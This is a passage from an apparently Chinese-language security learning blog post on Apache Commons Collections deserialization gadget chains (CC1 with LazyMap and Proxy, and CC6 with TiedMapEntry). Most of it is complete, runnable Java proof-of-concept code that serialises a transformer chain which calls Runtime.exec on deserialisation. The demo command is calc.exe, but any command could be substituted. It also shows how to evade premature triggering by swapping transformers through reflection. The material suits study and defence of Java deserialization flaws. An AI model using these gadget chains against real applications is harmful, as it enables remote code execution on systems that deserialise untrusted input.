                    Transformer transformerChain = new ChainedTransformer(transformers);
                    Map innerMap = new HashMap();
                    innerMap.put("value","buruheshen");
                    Map outerMap = TransformedMap.decorate(innerMap, null,transformerChain);
                    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
                    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
                    construct.setAccessible(true);
                    Object obj = construct.newInstance(Retention.class, outerMap);
                    ByteArrayOutputStream barr = new ByteArrayOutputStream();
                    ObjectOutputStream oos = new ObjectOutputStream(barr);
                    oos.writeObject(obj);
                    oos.close();
                    ObjectInputStream ois = new ObjectInputStream(new
                            ByteArrayInputStream(barr.toByteArray()));
                    Object o = (Object)ois.readObject();
            }
    }
下面是测试图：
## LazyMap反序列化链
上述反序列化链是由TransformMap搭配AnnotationInvocationHandler的readObject修改Map触发，其中最后一步就是setValue。不通过setValue触发也是可以的捏。
LazyMap.decorate绑定的Map，在get找不到值时会触发transform。AnnotationInvocationHandler有setValue但是没有get方法，不过该类下的invoke方法有get调用。用到`java.reflect.Proxy`触发Invoke。而触发的具体原理可以参考：`https://www.jianshu.com/p/774c65290218`。理解不了也没事，只需要知道Proxy代理能触发重写的InvocationHandler。
LazyMap的CC链反序列化流程：
  1. transfromChain的链一样，绑定到lazyMap上。
`Map outerMap = LazyMap.decorate(innerMap, transformerChain);`
  2. 反射得到AnnotationInvocationHandler构造函数，传入outMap实例化对象。调用outMap需要get获取值
  3. 借助proxy对象代理，自动调用AnnotationInvocationHandler的invoke的get方法。
上述代码只需要修改：
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
        construct.setAccessible(true);
        InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class,outerMap);
        Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},handler);
        handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
最后要再实例化的原因是入口点是AnnotationInvocationHandler的readObject，而proxy是Map对象，入口不对
正常执行是没问题的，但是在调试时可能会弹两遍甚至是三遍计算器。根据上面的对象代理知道Proxy代理了map对象(Map
proxyMap定义后)，执行一遍map就会触发一遍payload。可以学习ysoserial先new
ChainedTransformer假数组，最后再利用getDeclaredField获取私有方法iTransformers，把真正的Transformer数组设置进去
完整的poc：
    package org.example;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import java.lang.annotation.Retention;
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.util.HashMap;
    import java.util.Map;
    import java.lang.reflect.Field;
    public class CommonCollections1 {
        public static void main(String[] args) throws Exception {
            Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class },
                            new String[] {"calc.exe" }),
            };
            Transformer transformerChain = new ChainedTransformer(fakeTransformers);//先绑定假transform
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);
            Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
            Constructor construct = clazz.getDeclaredConstructor(Class.class,Map.class);
            construct.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)construct.newInstance(Retention.class,outerMap);
            Map proxyMap = (Map)Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class},handler);
            handler = (InvocationHandler)construct.newInstance(Retention.class, proxyMap);
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(handler);
            oos.close();
            ObjectInputStream ois = new ObjectInputStream(new
                    ByteArrayInputStream(barr.toByteArray()));
            Object o = (Object)ois.readObject();
        }
    }
## 高版本CC6
再想一遍cc1利用AnnotationInvocationHandler的原因，是因为AnnotationInvocationHandler可以put或者get原map对象，从而触发transform。在高版本时进行了修复，该类的readObject复制了一份linkedHashMap对象，而不是直接用传入的对象，自然也就不能触发transform
那就直接不用AnnotationInvocationHandler了，他不给我们用就不惯着它，在`org.apache.commons.collections.keyvalue.TiedMapEntry`中hashcode调用了getValue方法，getValue调用了map.get。所以只需要找到hashcode的调用
  * ysoserial是⽤`java.util.HashSet#readObject`到`HashMap#put()`到 `HashMap#hash(key)`最后到 `TiedMapEntry#hashCode()`
  * p神是`java.util.HashMap#readObject` 到`HashMap#hash()`到`TiedMapEntry#hashCode()`
HashMap的部分内容如下：
    static final int hash(Object key) {
         int h;
         return (key == null) ? 0 : (h = key.hashCode()) ^ (h >>> 16);
     }
    private void readObject(java.io.ObjectInputStream s)
     throws IOException, ClassNotFoundException {
         s.defaultReadObject();
         for (int i = 0; i hashcode了。lazyMap那里要用到一个HashMap，因为要继承Serializable接口，这里要用到一个HashMap存放TiedMapEntry的对象
    Map expMap = new HashMap();
    expMap.put(tme, "valuevalue");
就完事了。但有个问题，expMap.put(tme,"valuevalue")，put方法也像readObject一样，调用了一遍hash(key)
    public V put(K key, V value) {
     return putVal(hash(key), key, value, false, true);
    }
就导致lazyMap被调用了两遍，第一遍是fakeTransformers，第二遍是恶意的transformers。
faketransformers虽然没有触发命令执行，但是向tme添加了"keykey"的key(hashmap的value无论是否为"keykey"都会==ture，只要有值)，导致第二次没能进入if判断
画个图：
> 最后触发命令执行的transformer: key==keykey时输出true，不进入循环
>  
>  
>     public Object get(Object key){
>         if(map.containsKey(key)==false){
>             Object value=factory.transform(key);
>             map.put(key,value);
>             return value;
>         }
>     }
>  
解决办法:outerMap.remove("keykey")
完整poc:
    package org.example;
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.LazyMap;
    import java.io.ByteArrayInputStream;
    import java.io.ByteArrayOutputStream;
    import java.io.ObjectInputStream;
    import java.io.ObjectOutputStream;
    import org.apache.commons.collections.keyvalue.TiedMapEntry;
    import java.util.HashMap;
    import java.util.Map;
    import java.lang.reflect.Field;
    public class CommonCollections6 {
        public static void main(String[] args) throws Exception {
            Transformer[] fakeTransformers = new Transformer[] {new ConstantTransformer(1)};
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] { String.class,Class[].class }, new Object[] { "getRuntime",new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] { Object.class,Object[].class }, new Object[] { null, new Object[0] }),
                    new InvokerTransformer("exec", new Class[] { String.class },
                            new String[] {"calc.exe" }),
            };
            Transformer transformerChain = new ChainedTransformer(fakeTransformers);//先绑定假transform
            Map innerMap = new HashMap();
            Map outerMap = LazyMap.decorate(innerMap, transformerChain);
            TiedMapEntry tme = new TiedMapEntry(outerMap, "keykey");
            Map expMap = new HashMap();
            expMap.put(tme, "valuevalue");
            outerMap.remove("keykey");
            Field f = ChainedTransformer.class.getDeclaredField("iTransformers");
            f.setAccessible(true);
            f.set(transformerChain, transformers);
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            ObjectOutputStream oos = new ObjectOutputStream(barr);
            oos.writeObject(expMap);
            oos.close();
            ObjectInputStream ois = new ObjectInputStream(new
                    ByteArrayInputStream(barr.toByteArray()));
            Object o = (Object)ois.readObject();
        }
    }
测试图：
工具推荐：SerializationDumper 16进制序列化内容转字符串
ysoserial 用户根据自己的利用链生成反序列化数据
文章或许有许多错误，请指正
参考： p神的《java安全漫谈》学习。